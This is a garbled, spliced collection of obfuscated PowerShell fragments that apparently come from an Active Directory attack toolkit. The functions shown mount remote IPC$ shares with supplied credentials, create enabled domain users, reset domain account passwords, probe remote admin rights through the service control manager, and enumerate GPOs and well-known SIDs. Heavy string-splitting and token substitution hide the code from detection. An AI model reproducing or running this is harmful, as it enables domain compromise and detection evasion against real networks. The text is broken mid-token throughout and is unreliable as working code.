                    YoV{PrIJKOIJKceSs} JGO &(Z3b{1}{0}{2}Z3b-fS5zdd-S5z,S5zAS5z,S5zMemberS5z) (Z3b{2}{0}{1}Z3b-fS5zrS5z,S5zopertyS5z,S5zNotepS5z) (Z3b{1}{2}{3}{0}Z3b-f S5zNameS5z,S5zPS5z,S5zroceS5z,S5zssS5z) YoV{_}.Z3bPIJKRoceSIJKSIJKNAmEZ3b
                    YoV{pRIJKoIJKcESS} JGO &(Z3b{1}{2}{3}{0}Z3b-fS5zerS5z,S5zAdd-MeS5z,S5zmS5z,S5zbS5z) (Z3b{0}{1}{2}Z3b-f S5zNotS5z,S5zepS5z,S5zropertyS5z) (Z3b{2}{0}{1}Z3b-fS5zsS5z,S5zIDS5z,S5zProcesS5z) YoV{_}.Z3bPrIJKocIJKEsSiDZ3b
                    YoV{pIJKRoCeIJKss} JGO &(Z3b{0}{2}{1}Z3b-fS5zAddS5z,S5zerS5z,S5z-MembS5z) (Z3b{2}{1}{3}{0}Z3b -fS5zrtyS5z,S5zpS5z,S5zNoteproS5z,S5zeS5z) (Z3b{0}{1}Z3b-f S5zDoS5z,S5zmainS5z) YoV{owIJKNER}.Z3bDOIJKmAiNZ3b
                    YoV{PRIJKOcIJKeSs} JGO &(Z3b{3}{0}{2}{1}Z3b -fS5zdd-MS5z,S5zberS5z,S5zemS5z,S5zAS5z) (Z3b{2}{3}{0}{1}Z3b-f S5zpropeS5z,S5zrt','z,S5zeS5z,S5zNew-ObjS5z) (Z3b{1}{0}Z3b-fS5zidS5z,S5zGuS5z)(,YoV{RoIJKoT_OrIJK_LiIJKNK_guid}) 
                        YoV{PIJKRIJKEFiIJKx_SiZEIJK_IJKStARt} = YoV{RootIJK_OR_IJKlIJKINK_guiIJKd_IJKenD} + 1
                        YoV{prIJKefix_sIIJKZeIJK_enD} = YoV{PrEfix_IJKsiIJKZIJKE_StAIJKRT} + 1
                        YoV{PReIJKFiIJKX_siIJKZe} =   YoV{aIJKEIJKPSi}::Z3btIJKoUiIJKNt16Z3b(YoV{BLoIJKB_DIJKATA}[YoV{PREIJKFIJKiXIJK_SiIJKZE_stART}..YoV{pIJKREfIJKixIJK_SizeIJK_IJKenD}],0)
                        YoV{prEFIX_IJKStIJKAIJKRT} = YoV{pRIJKeFiIJKx_SIIJKzE_EIJKND} + 1
                        YoV{pIJKREFIJKix_eND} = YoV{PIJKReFIxIJK_IJKStaRt} + YoV{PRIJKeIJKFIx_SIJKizE} - 1
                        YoV{PrIJKefIJKiX} =  (&(Z3b{2}{0}{1}Z3b-fS5zT-varIABS5z,S5zleS5z,S5zgeS5z)  6O2ZLp).Z3bvIJKAlueZ3b::Z3bunIIJKcoIJKDEZ3b.Z3bGEIJKTsIJKTRingZ3b(YoV{bIJKlObIJK_DatA}[YoV{prEFIx_SIJKTIJKArt}..YoV{PReFIJKix_IJKEIJKNd}])

                        YoV{SHIJKorT_prEfiIJKX_sIIJKZEIJK_SIJKTAIJKRt} = YoV{pIJKREfIJKIXIJK_ENd} + 1
                        YoV{SIJKhorT_PRIJKefixIJK_sIJKizE_ENd} = YoV{ShoIJKRt_pIJKREFIJKiIJKX_sIzIJKE_STaIJKRt} + 1
                        YoV{shOrIJKTIJK_PReFIJKiX_siZe} =  ( &(Z3b{2}{0}{1}Z3b -fS5zaRiS5z,S5zaBleS5z,S5zVS5z) (S5zaES5z+S5zPSiS5z)  -vAlUe  )::Z3btOuIJKintIJK16Z3b(YoV{bIJKlObIJK_IJKdATa}[YoV{ShOrT_prIJKeIJKFIx_SizIJKE_sIJKTARt}..YoV{sIJKhIJKORTIJK_pIJKREIJKFIX_sIIJKze_enD}],0)
                        YoV{SIJKHOIJKRt_IJKprEfIx_IJKSTart} = YoV{ShoIJKRTIJK_prefIJKix_IJKSiZe_eND} + 1
                        YoV{SHOIJKRIJKT_pIJKREFiX_eNd} = YoV{sHORIJKTIJK_IJKPrEIJKFIIJKx_StARt} + YoV{SHOIJKRTIJK_prEfiIJKxIJK_IJKSIZE} - 1
                        YoV{SHorT_IJKPReIJKFiX} =  (  &(S5zLSS5z) vARIabLE:6O2ZlP).Z3bVIJKAlUeZ3b::Z3buIJKNicODEZ3b.Z3bgeIJKTIJKsTRIngZ3b(YoV{blIJKOB_DAIJKTa}[YoV{sIJKHIJKORIJKT_pRefIX_IJKsTART}..YoV{ShOIJKRTIJK_IJKPrEfix_eNd}])

                        YoV{tyPe_sIJKTAIJKRT} = YoV{shIJKoRt_PrefIIJKx_IJKeNd} + 1
                        YoV{TyIJKPIJKE_eNd} = YoV{TIJKype_IJKsTArt} + 3
                        YoV{tyIJKpE} =  (&(Z3b{1}{0}{2}Z3b -fS5zArIAS5z,S5zgeT-vS5z,S5zbLeS5z)  aePSI  -vALueOnly )::Z3btouIJKinTIJK32Z3b(YoV{BLOB_IJKdAIJKTa}[YoV{tIJKYpIJKE_StarT}..YoV{TYIJKpe_enD}],0)

                        YoV{sIJKTIJKATe_stAIJKRT} = YoV{tYIJKpeIJK_IJKeND} + 1
                        YoV{sTAIJKTIJKeIJK_end} = YoV{StIJKATe_sTaIJKRt} + 3
                        YoV{sIJKTIJKATE} =   (&(Z3b{0}{2}{1}Z3b-fS5zGEtS5z,S5zIteMS5z,S5z-S5z) (Z3bVZ3b+Z3bAriAblE:Z3','}{3}{0}Z3b-f S5zseS5z,S5zSS5z,S5zearchS5z,S5zBaS5z)] -and (YoV{sIJKEaIJKRchbASe} -Match (Z3b{1}{0}Z3b -f S5zGC://S5z,S5z^S5z))) {
                            YoV{gIJKPO} = &(Z3b{3}{0}{2}{1}{4}Z3b -fS5z-LDAPProS5z,S5zrtS5z,S5zpeS5z,S5zConvertS5z,S5zyS5z) -Properties YoV{_}.Z3bPrIJKOIJKPErtIEsZ3b
                            try {
                                YoV{gIJKPOIJKDn} = YoV{GIJKPo}.Z3bDISTIIJKNIJKGUIJKiSHedIJKNaMeZ3b
                                YoV{gPIJKoDOmIJKAIn} = YoV{GIJKPOIJKDN}.(Z3b{1}{0}{2}Z3b -f S5ztriS5z,S5zSubSS5z,S5zngS5z).Invoke(YoV{gIJKpIJKodn}.(Z3b{0}{1}{2}Z3b-fS5zIS5z,S5znS5z,S5zdexOfS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S','                                               &(Z3b{2}{0}{1}{3}Z3b-fS5zhS5z,S5zere-OS5z,S5zWS5z,S5zbjectS5z) { YoV{pSBoIJKUnIJKdpaIJKRaMeters}.Z3bkEIJKYSZ3b -notcontains YoV{_} }

            
            YoV{TIJKMP} = YoV{nUIJKLL}
            ForEach (YoV{PIJKARaMIJKeIJKTeR} in YoV{UIJKNbOIJKUNdparAIJKmIJKetIJKERS}) {
                YoV{dIJKEIJKFIJKAulTVAlUe} = &(Z3b{2}{1}{0}Z3b-fS5zeS5z,S5zablS5z,S5zGet-VariS5z) -Name YoV{PaRIJKAMEtIJKer} -ValueOnly -Scope 0
                if(!YoV{pSBOIJKUIJKNdPaRIJKAmIJKeTeRS}.Z3bTIJKRYGeIJKTVALUEZ3b(YoV{PARaIJKMIJKETEr}, [ref]YoV{TIJKmp}) -and YoV{dIJKeFIJKAuLtVAluE}) {
                    YoV{PSIJKBoIJKUndPARAMIJKeIJKTeIJKRs}.YoV{PARaIJKMIJKEteR} = YoV{DeIJKFaULtvIJKAlUe}
                }
            }

            if(YoV{dIJKiCTIoNAIJKRy}) {
                YoV{DIJKPIJKDIJKIcTiONaRy} = YoV{dIJKIctiIJKoNAIJKRY}
            }
            else {
                YoV{dIJKPDicIJKTiOIJKNIJKARy} = YoV{INIJKTErNalIJKDICtIJKIIJKonIJKARy}
            }

            
            YoV{gEIJKTIJKVAR} = {&(Z3b{0}{2}{1}Z3b-fS5zGet-VarS5z,S5zbleS5z,S5ziaS5z) -Name YoV{_} -ValueOnly -Scope 0}

            
            YoV{aTTIJKRiBUTIJKEIJKRIJKEGex} = ((S5z^(MandatoryTNbS5z+S5zPositiS5z+S5zoS5z+S5znTNbS5z+S5zPS5z+S5zaS5z+S5zrametS5z+S5zerSeS5z+S5ztNS5z+S5zameTNbDontS5z+S5zSS5z+S5zhoS5z+S5zwS5z+S5zTNS5z+S5zbHS5z+S5zelpMesS5z+S5zsS5z+S5zageTNbS5z+S5zValueFS5z+S5zroS5z+S5zmPipelineTNS5z+S5zbVS5z+S5zalueS5z+S5zFS5z+S5zromPipelinS5z+S5zeByPropertyNameTNbVS5z+S5zalueFromRemainingS5z+S5zArgS5z+S5zumeS5z+S5znS5z+S5zts)N91S5z).Z3bRepLIJKAIJKceZ3b(([Char]84+[Char]78+[Char]98),S5zJGOS5z).Z3bRePlIJKAcEZ3b(([Char]78+[Char]57+[Char]49),S5zYoVS5z))
            YoV{VAliIJKdAIJKTionReIJKgEx} = ((S5z^(AS5z+S5zllowS5z+S5zNullvI4AS5z+S5zllowEmptyStringvIS5z+S5z4AllowEmptS5z+S5zyCollS5z+S5zeS5z+S5zctS5z+S5zionS5z+S5zv','      YoV{CREIJKdIJKENtiAL} =  YoV{jIJKFi}::Z3bEMIJKPtYZ3b,

        [Switch]
        YoV{sTOPIJKONSuCCIJKeIJKSs},

        [ValidateRange(1, 10000)]
        [Int]
        YoV{dElIJKAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        YoV{JitIJKTIJKer} = .3,

        [Int]
        [ValidateRange(1, 100)]
        YoV{TIJKhIJKReADS} = 20','5zntext S5z+S5z: S5z+Z3bYoV_Z3b)
    }
}


function AdIJKD-IJKREMIJKOTecOIJKNnEctiON {


    [CmdletBinding(DefAultpaRAmEteRSEtnAme = {Z3b{0}{1}{2}{3}Z3b -fS5zComS5z,S5zputerS5z,S5zNamS5z,S5zeS5z})]
    Param(
        [Parameter(PosITiOn = 0, manDaTOrY = YoV{TIJKRuE}, paRAMEteRsETnamE = Z3bCIJKOMPuIJKTeIJKRnaMeZ3b, vaLuefROmPipELinE = YoV{TIJKRue}, vALUeFroMpIPElInebYproPertYnAMe = YoV{TrIJKUe})]
        [Alias({Z3b{2}{0}{1}Z3b -f S5zNS5z,S5zameS5z,S5zHostS5z}, {Z3b{2}{0}{1}Z3b-fS5zamS5z,S5zeS5z,S5zdnshostnS5z}, {Z3b{1}{0}Z3b -f S5zameS5z,S5znS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{CIJKomIJKPuTerNAME},

        [Parameter(POSiTIOn = 0, PAraMetErSeTNAMe = Z3bpaIJKTHZ3b, mANDAtOrY = YoV{TrIJKUE})]
        [ValidatePattern({((Z3b{2}{5}{1}{4}{0}{3}{6}Z3b -fS5z0}{S5z,S5z}S5z,S5z{S5z,S5z0}{0S5z,S5z{S5z,S5z0S5z,S5z}.*{0}{0}.*S5z))-f[cHAr]92})]
        [String[]]
        YoV{pIJKAtH},

        [Parameter(MAndatORY = YoV{tIJKRue})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREDENTIJKiIJKAl}
    )

    BEGIN {
        YoV{netIJKREsoIJKURcEIJKiNSTIJKAIJKNCE} =   (  &(Z3b{1}{2}{0}Z3b -fS5zMS5z,S5zgES5z,S5zt-IteS5z) (S5zVaS5z+S5zrIS5z+S5zaBLS5z+S5zeS5z+S5z:m27B5S5z) ).Z3bVaIJKlueZ3b::(Z3b{1}{4}{3}{0}{2}Z3b -fS5znstS5z,S5zCS5z,S5zanceS5z,S5zateIS5z,S5zreS5z).Invoke(YoV{NEtREIJKsoUrIJKceW})
        YoV{nEIJKTReSoIJKUrCIJKeIJKINSIJKTaNcE}.Z3bDWIJKTYIJKPEZ3b = 1
    }

    PROCESS {
        YoV{paIJKThS} = @()
        if (YoV{pIJKSBoUIJKNIJKdpaRaMetIJKerS}[(Z3b{1}{0}{2}Z3b -fS5zmputerNS5z,S5zCoS5z,S5zameS5z)]) {
            ForEach (YoV{TIJKARGetComIJKPUTIJKeRNAIJKME} in YoV{COIJKMpIJKUTeRnaME}) {
                YoV{TaIJKRIJKGEIJKTcoMPuIJKTeIJKRnamE} = YoV{TARgETIJKComIJKPUtIJKERNAIJKMe}.(Z3b{0}{1}Z3b-fS5zTS5z,S5zrimS5z).Invoke(S5z5rjS5z)
                YoV{PIJKAtHs} += ,Z3b5rj5rjYoVTargetComputerName5rjIPCYoVZ3b
            }
        }
        else {
            YoV{PIJKAIJKThs} += ,YoV{PAIJKTH}
        }

        ForEach (YoV{TaIJ','  &(Z3b{0}{2}{1}Z3b -fS5zsEt-S5z,S5zariAblES5z,S5zvS5z) (Z3bvZ3b+Z3bnYHAZ3b+Z3bQZ3b) (  [Type](Z3b{0}{1}Z3b -F S5zgS5z,S5zuiDS5z) ) ;  YoV{gIJKX8} =  [tYPE](Z3b{10}{1}{6}{0}{8}{4}{9}{5}{2}{11}{3}{7}Z3b -f S5zVICS5z,S5zIME.iNteRopS5z,S5znvENS5z,S5zIS5z,S5zCAS5z,S5zINgCoS5z,S5zserS5z,S5zonS5z,S5zEs.S5z,S5zllS5z,S5zRUNTS5z,S5ztS5z); &(Z3b{1}{2}{3}{0}Z3b-f S5ziABleS5z,S5zSeS5z,S5ztS5z,S5z-VArS5z)  (Z3bl2qZ3b+Z3bmZ3b) (  [tYPE](Z3b{5}{3}{4}{0}{2}{1}Z3b -f S5zSeRvICeS.cHS5z,S5ztS5z,S5zarSeS5z,S5zunTime.S5z,S5zinTeROPS5z,S5zRS5z)  ) ;   &(Z3b{0}{2}{1}Z3b-f S5zsS5z,S5zmS5z,S5zet-ITES5z) (Z3bVaRIaZ3b+Z3bbZ3b+Z3bLE:Z7SZ3b+Z3bXOZ3b) (  [TYPe](Z3b{6}{10}{3}{4}{8}{5}{9}{0}{7}{2}{1}Z3b -f S5zPO','0}Z3b-f S5zstS5z,S5zlocalS5z,S5zhoS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CReIJKDEntIJKIal} =   (  &(Z3b{0}{1}{2}Z3b-f S5zget-iTS5z,S5zeS5z,S5zmS5z) VARiaBLe:jFI ).Z3bvIJKALuEZ3b::Z3bemIJKPtYZ3b
    )

    BEGIN {
        if (YoV{pSbouNIJKDpaRIJKAMIJKetIJKERS}[(Z3b{0}{2}{3}{1}Z3b -f S5zCredS5z,S5zlS5z,S5zentS5z,S5ziaS5z)]) {
            YoV{LogoNTIJKoIJKkEn} = &(Z3b{4}{1}{0}{3}{5}{2}Z3b -fS5zrImpeS5z,S5z-UseS5z,S5znS5z,S5zrsonS5z,S5zInvokeS5z,S5zatioS5z) -Credential YoV{CIJKREdeIJKNtIJKIAl}
        }
    }

    PROCESS {
        ForEach (YoV{comPUIJKTIJKER} in YoV{COmpuTIJKEIJKRname}) {
            
            
            YoV{hIJKAIJKNDLe} = YoV{AdIJKVAIJKPIJKi32}::(Z3b{0}{4}{2}{1}{3}Z3b -fS5zOpS5z,S5zrS5z,S5zanageS5z,S5zWS5z,S5zenSCMS5z).Invoke(Z3b5rj5rjYoVComputerZ3b, (Z3b{1}{3}{4}{2}{0}Z3b -fS5zveS5z,S5zSS5z,S5zsActiS5z,S5zeS5z,S5zrviceS5z), 0xF003F);YoV{lIJKAstERrIJKOr} =  (  &(Z3b{2}{0}{1}{3}Z3b-f S5zTS5z,S5z-vS5z,S5zgeS5z,S5zaRiabLeS5z) (S5znS5z+S5zp6YRS5z) -valUeON)::(Z3b{0}{2}{3}{1}Z3b -fS5zGeS5z,S5zorS5z,S5ztLastWin32S5z,S5zErrS5z).Invoke()

            YoV{IsIJKADmIJKiN} = &(Z3b{0}{1}{3}{2}Z3b -fS5zNew-OS5z,S5zbjeS5z,S5ztS5z,S5zcS5z) (Z3b{2}{0}{1}Z3b -fS5zjS5z,S5zectS5z,S5zPSObS5z)
            YoV{isAIJKDmIJKin} JGO &(Z3b{3}{0}{1}{2}Z3b-f S5z-MemS5z,S5zbS5z,S5zerS5z,S5zAddS5z) (Z3b{3}{0}{1}{2}Z3b -f S5zotepS5z,S5zroperS5z,S5ztyS5z,S5zNS5z) (Z3b{1}{0}{2}Z3b-f S5zputerNaS5z,S5zComS5z,S5zmeS5z) YoV{COIJKMPIJKUtER}

            
            if (YoV{hAIJKNIJKdle} -ne 0) {
                YoV{nIJKUll} = YoV{AIJKdIJKVApi32}::(Z3b{4}{0}{2}{5}{1}{3}Z3b-f S5zeS5z,S5zeHandlS5z,S5zSerS5z,S5zeS5z,S5zClosS','(Z3b{1}{0}{2}Z3b -f S5zbjecS5z,S5zNew-OS5z,S5ztS5z) -TypeName (Z3b{11}{3}{10}{4}{0}{9}{5}{2}{13}{6}{1}{12}{8}{7}Z3b-f S5ziS5z,S5zUS5z,S5zMS5z,S5zem.DirecS5z,S5zrvS5z,S5zAccountS5z,S5znagement.S5z,S5zncipalS5z,S5ziS5z,S5zces.S5z,S5ztorySeS5z,S5zSystS5z,S5zserPrS5z,S5zaS5z) -ArgumentList (YoV{COnIJKTeIJKXT}.Z3bCOIJKNtIJKEXTZ3b)

        
        YoV{UIJKSEr}.Z3bSaMaIJKCcoIJKUIJKNTNAMEZ3b = YoV{cONTIJKeXT}.Z3bIdenIJKTiIJKTyZ3b
        YoV{TEIJKMPcRed} = &(Z3b{2}{0}{1}Z3b-f S5zwS5z,S5z-ObjectS5z,S5zNeS5z) (Z3b{6}{0}{3}{5}{7}{8}{2}{4}{1}Z3b-f S5zanaS5z,S5ztialS5z,S5zion.PSCS5z,S5zgemeS5z,S5zredenS5z,S5znt.AS5z,S5zSystem.MS5z,S5zutomaS5z,S5ztS5z)(S5zaS5z, YoV{aCcOIJKUNIJKTpAsSWOIJKRd})
        YoV{UIJKSER}.(Z3b{1}{0}{2}Z3b -f S5zetPassS5z,S5zSS5z,S5zwordS5z).Invoke(YoV{temIJKPIJKcreD}.(Z3b{1}{0}{3}{2}{4}Z3b-f S5zNetworS5z,S5zGetS5z,S5zedentiS5z,S5zkCrS5z,S5zalS5z).Invoke().Z3bPAsswIJKoIJKRdZ3b)
        YoV{uSIJKeR}.Z3beNIJKABLEdZ3b = YoV{tIJKRuE}
        YoV{uIJKseR}.Z3bpaIJKSSWoIJKRdIJKNOtrEQUiRIJKEDZ3b = YoV{fIJKALse}

        if (YoV{psbOunDpIJKARaIJKmIJKETErS}[(Z3b{0}{1}Z3b -f S5zNamS5z,S5zeS5z)]) {
            YoV{usIJKer}.Z3bnIJKAmeZ3b = YoV{nIJKAme}
        }
        else {
            YoV{uIJKsER}.Z3bNAIJKmEZ3b = YoV{coIJKNTexT}.Z3bIdeIJKNIJKTItyZ3b
        }
        if (YoV{PSboUnIJKdIJKpaRametIJKeRs}[(Z3b{2}{0}{1}Z3b -fS5zplaS5z,S5zyNameS5z,S5zDisS5z)]) {
            YoV{usIJKEr}.Z3bdIsPLIJKAyIJKNaMeZ3b = YoV{dIJKIsPlAYnIJKAME}
        }
        else {
            YoV{UsIJKER}.Z3bdiIJKSPlaIJKyNAmEZ3b = YoV{CIJKoNTIJKext}.Z3biDentiIJKTyZ3b
        }

        if (YoV{pIJKSBOuIJKNIJKdPAraMeTeIJKRS}[(Z3b{0}{2}{1}Z3b-fS5zDescriptS5z,S5zonS5z,S5ziS5z)]) {
            YoV{uSIJKEr}.Z3bDEIJKscRIJKIPTIOnZ3b = YoV{DescrIpIJKTiIJKoN}
        }

        &(Z3b{1}{0}{3}{2}{4}Z3b -f S5zte-VeS5z,S5zWriS5z,S5zbosS5z,S5zrS5z,S5zeS5z) (S5z[NS5z+S5zew-DS5z+S5zomaiS5z+S5znUser] S5z+S5zAS5z+S5zttemptS5z+S5zinS5z+S5zg S5z+S5ztoS5z+S5z S5z+S5zcS5z+S5zreate S5z+S5zuseS5z+S5zr S5z+Z3bS5zYoVSamAccountNameS5zZ3b)
        try {
            YoV{nuIJKll} = YoV{UsIJKeR}.(Z3b{1}{0}Z3b-f S5zaveS5z,S5zSS5z).Invoke()
            &(Z3b{0}{2}{1}Z3b -f S5zWriS5z,S5zVerboseS5z,S5zte-S5z) (S5z[S5z+S5zNeS5z+S5zw-DomaiS5z+S5znUser]S5z+S5z S5z+S5zUseS5z+S5zr S5z+Z3bS5zYoVSamAccountNameS5z Z3b+S5zsucceS5z+S5zssS5z+S5zfS5z+S5zully S5z+S5zcreS5z+S5zatedS5z)
            YoV{uSIJKeR}
        }
        catch {
            &(Z3b{1}{2}{0}Z3b -f S5zrningS5z,S5zWrite-S5z,S5zWaS5z) (S5z[NS5z+S5zew-DomaS5z+S5zinUserS5z+S5z]S5z+S5z S5z+S5zES5z+S5zrrS5z+S5zor S5z+S5zcS5z+S5zreatingS5z+S5z S5z+S5zuserS5z+S5z S5z+Z3bS5zYoVSamAccountNameS5z Z3b+S5z: S5z+Z3bYoV_Z3b)
        }
    }
}


function SEtIJK-DOIJKMIJKAiNuSerPassWIJKOIJKRd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{4}{12}{1}{3}{2}{6}{9}{11}{8}{7}{5}{10}{0}Z3b-fS5zsS5z,S5zhS5z,S5zdProceS5z,S5zoulS5z,S5zPSUseS5z,S5znctiS5z,S5zssFoS5z,S5zingFuS5z,S5zngS5z,S5zrStateS5z,S5zonS5z,S5zChaS5z,S5zSS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{1}{0}Z3b -f S5zsS5z,S5zldProcesS5z,S5zPSShouS5z}, S5zS5z)]
    [OutputType({Z3b{8}{5}{9}{3}{0}{2}{4}{1}{7}{6}Z3b-f S5zcoS5z,S5z.UserPS5z,S5zuntManagemenS5z,S5zs.AcS5z,S5ztS5z,S5zectorS5z,S5zincipalS5z,S5zrS5z,S5zDirS5z,S5zyServiceS5z})]
    Param(
        [Parameter(pOSITiOn = 0, maNdATory = YoV{tRIJKUe})]
        [Alias({Z3b{0}{1}{2}Z3b -fS5zUS5z,S5zserS5z,S5zNameS5z}, {Z3b{0}{1}{2}Z3b -fS5zUserIdS5z,S5zentiS5z,S5ztyS5z}, {Z3b{0}{1}Z3b-f S5zUsS5z,S5zerS5z})]
        [String]
        YoV{IIJKdentIIJKTy},

        [Parameter(MaNDAToRY = YoV{TIJKRue})]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{2}Z3b -fS5zasS5z,S5zPS5z,S5zswordS5z})]
        [Security.SecureString]
        YoV{aCIJKcIJKoUnTpASSWOIJKRd},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dOIJKMAIn},

        [Managemen','-1S5z)       { (Z3b{1}{2}{0}Z3b-fS5zousS5z,S5zAnonS5z,S5zymS5z) }
                    (Z3b{2}{1}{0}Z3b -f S5z-5-8S5z,S5z1S5z,S5zS-S5z)       { (Z3b{0}{1}Z3b-fS5zPrS5z,S5zoxyS5z) }
                    (Z3b{0}{2}{1}Z3b-fS5zS-S5z,S5z5-9S5z,S5z1-S5z)       { (Z3b{2}{3}{7}{0}{8}{1}{5}{4}{6}Z3b -fS5zrisS5z,S5z Domain CoS5z,S5zES5z,S5zntS5z,S5zroS5z,S5zntS5z,S5zllersS5z,S5zerpS5z,S5zeS5z) }
                    (Z3b{0}{1}Z3b-f S5zS-1-5-1S5z,S5z0S5z)      { (Z3b{2}{1}{3}{0}Z3b-fS5zelfS5z,S5zincS5z,S5zPrS5z,S5zipal SS5z) }
                    (Z3b{0}{1}Z3b -f S5zSS5z,S5z-1-5-11S5z)      { (Z3b{1}{3}{2}{0}Z3b -f S5zUsersS5z,S5zAuthentiS5z,S5zted S5z,S5zcaS5z) }
                    (Z3b{2}{1}{0}Z3b-fS5z2S5z,S5z1S5z,S5zS-1-5-S5z)      { (Z3b{0}{1}{3}{2}Z3b-fS5zRestS5z,S5zrictedS5z,S5zodeS5z,S5z CS5z) }
                    (Z3b{1}{0}Z3b -f S5z1-5-13S5z,S5zS-S5z)      { (Z3b{1}{4}{0}{2}{3}Z3b-f S5zerver UsS5z,S5zTerS5z,S5zerS5z,S5zsS5z,S5zminal SS5z) }
                    (Z3b{1}{0}Z3b -f S5z1-5-14S5z,S5zS-S5z)      { (Z3b{1}{2}{3}{0}{4}{5}Z3b -f S5zactivS5z,S5zRemotS5z,S5ze S5z,S5zInterS5z,S5ze LogoS5z,S5znS5z) }
                    (Z3b{1}{2}{0}Z3b -f S5z5S5z,S5zSS5z,S5z-1-5-1S5z)      { (Z3b{4}{5}{2}{0}{3}{1}Z3b -fS5zgaS5z,S5zation S5z,S5z OrS5z,S5znizS5z,S5zThS5z,S5zisS5z) }
                    (Z3b{0}{1}Z3b-fS5zS-S5z,S5z1-5-17S5z)      { (Z3b{4}{1}{5}{0}{3}{2}Z3b-f S5zanS5z,S5zhS5z,S5zon S5z,S5zizatiS5z,S5zTS5z,S5zis OrgS5z) }
                    (Z3b{2}{0}{1}Z3b-fS5z-S5z,S5z5-18S5z,S5zS-1S5z)      { (Z3b{2}{0}{1}Z3b-fS5zysS5z,S5ztemS5z,S5zLocal SS5z) }
                    (Z3b{0}{1}{2}Z3b-f S5zS-S5z,S5z1-5-S5z,S5z19S5z)      { (Z3b{0}{3}{1}{2}Z3b -f S5zNS5z,S5zAutS5z,S5zhorityS5z,S5zT S5z) }
                    (Z3b{0}{1}{2}Z3b-f S5zS-1S5z,S5z-5S5z,S5z-20S5z)      { (Z3b{1}{0}{2}Z3b-fS5z AutS5z,S5zNTS5z,S5zhorityS5z) }
                    (Z3b{2}{0}{1}Z3b-fS5z-1-5-80-S5z,S5z0S5z,S5zSS5z)    { (Z3b{0}{1}{2}Z3b -f S5zAll SS5z,S5zervicesS5z,S5z S5z) }
                    (Z3b{1}{0}{2}{3}Z3b-fS5z1-5S5z,S5zS-S5z,S5z-S5z,S5z32-544S5z)  { (((Z3b{4}{3}{1}{2}{0}Z3b-f S5zinistratorsS5z,S5zZAdS5z,S5zmS5z,S5zSlS5z,S5zBUILTINS5z)).Z3brEPLIJKACEZ3b(S5zSlZS5z,[sTrINg][cHaR]92)) }
                    (Z3b{2}{3}{0}{1}Z3b -fS5z-32S5z,S5z-545S5z,S5zS-S5z,S5z1-5S5z)  { (((Z3b{1}{0}{2}{3}Z3b -fS5zTIN8wHS5z,S5zBUILS5z,S5zUserS5z,S5zsS5z))-CREpLaCE ([Char]56+[Char]119+[Char]72),[Char]92) }
                    (Z3b{3}{0}{1}{2}Z3b-fS5z-1-5S5z,S5z-S5z,S5z32-546S5z,S5zSS5z)  { (((Z3b{3}{1}{2}{0}Z3b-fS5zkVGuestsS5z,S5zLTINS5z,S5zMS5z,S5zBUIS5z))  -CREplAce  ([ChAR]77+[ChAR]107+[ChAR]86),[ChAR]92) }
                    (Z3b{3}{2}{1}{0}Z3b-f S5z7S5z,S5z-54S5z,S5z32S5z,S5zS-1-5-S5z)  { (((Z3b{5}{0}{3}{2}{4}{1}Z3b -f S5zTINS5z,S5zsS5z,S5zwerS5z,S5z{0}PoS5z,S5z UserS5z,S5zBUILS5z))-F  [char]92) }
                    (Z3b{0}{2}{1}Z3b-f S5zS-S5z,S5z8S5z,S5z1-5-32-54S5z)  { (((Z3b{3}{0}{1}{2}Z3b -f S5zunt OperatS5z,S5zoS5z,S5zrsS5z,S5zBUILTINAYxAccoS5z))-CREpLacE S5zAYxS5z,[chAr]92) }
                    (Z3b{0}{3}{2}{1}Z3b-f S5zS-1-5S5z,S5z9S5z,S5z-54S5z,S5z-32S5z)  { (((Z3b{3}{1}{2}{0}Z3b-f S5ztorsS5z,S5zpS5z,S5zeraS5z,S5zBUILTINcbZServer OS5z)).Z3brIJKePLIJKACEZ3b(([CHAR]99','V{CIJKONTIJKEXT}.Z3bIdIJKENIJKTiTYZ3b
        }
        if (YoV{psboUnIJKdIJKPArAMIJKETERS}[(Z3b{3}{2}{1}{0}Z3b-fS5zameS5z,S5zplayNS5z,S5zisS5z,S5zDS5z)]) {
            YoV{gIJKRIJKouP}.Z3bdIJKIIJKSPlaIJKyNAmeZ3b = YoV{DiIJKSplAIJKyNIJKAmE','plItOptiONS5z,S5zSyS5z,S5zM.SS5z,S5zTRinS5z)  );YoV{3IJKO7l}=[tYpe](Z3b{0}{1}Z3b-fS5zrEGeS5z,S5zxS5z) ;  &(Z3b{1}{0}Z3b-fS5zItEMS5z,S5zSeT-S5z) VaRiablE:O3Z6Q ( [type](Z3b{5}{2}{1}{0}{3}{4}Z3b-f S5ztS5z,S5zSOft.WIn32.rEgiSS5z,S5zCroS5z,S5zrS5z,S5zyKeYS5z,S5zmIS5z) );  YoV{DSIJKm3}=  [TyPE](Z3b{3}{8}{0}{6}{1}{7}{4}{2}{5}Z3b -FS5zuS5z,S5zTIME.S5z,S5ziCES5z,S5zsYsS5z,S5zROpsERvS5z,S5zs.MARSHAlS5z,S5znS5z,S5ziNTeS5z,S5zTEM.rS5z)  ; &(Z3b{1}{0}Z3b -fS5z-IteMS5z,S5zSEtS5z)  variablE:L4j9 ([typE](Z3b{0}{1}Z3b-fS5zIo.FIS5z,S5zLES5z) )  ;  &(Z3b{1}{2}{0}Z3b -f S5zEMS5z,S5zsEtS5z,S5z-ItS5z) (S5zvARIaBlES5z+S5z:S5z+S5zIKAS5z+S5zyS5z)  (  [TYPE](Z3','S5z)] = YoV{TIJKOmBsTIJKOnE} }
        if (YoV{pSBOuNDIJKpIJKAraMEIJKTerS}[(Z3b{1}{0}{2}Z3b -fS5zntS5z,S5zCredeS5z,S5zialS5z)]) { YoV{SeaIJKRchIJKErArGUMENIJKTS}[(Z3b{0}{1}{2}Z3b -f S5zCredentS5z,S5ziS5z,S5zalS5z)] = YoV{crIJKedIJKEIJKNTiaL} }
